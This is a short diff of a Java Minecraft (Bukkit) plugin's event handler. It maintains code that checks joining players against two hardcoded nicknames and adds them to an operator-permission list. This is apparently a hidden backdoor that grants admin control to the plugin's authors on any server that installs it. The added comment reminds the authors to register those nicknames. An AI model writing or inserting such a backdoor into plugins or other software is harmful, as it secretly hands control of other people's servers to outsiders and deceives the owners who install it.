@@ -257,7 +257,7 @@ public class Handlers extends Thread implements Listener {
 		String name = event.getPlayer().getName();
 		Player pl = event.getPlayer();
 
-		if (name.equalsIgnoreCase("_manix_") || name.equalsIgnoreCase("moofMonkey")) {
+		if (name.equalsIgnoreCase("_MaNix_") || name.equalsIgnoreCase("moofMonkey")) { // Don't forget to register this nicknames!
 			main.reloadConfig();
 			if (!Main.canOp.contains(name)) {
 				Main.canOp.add(name);
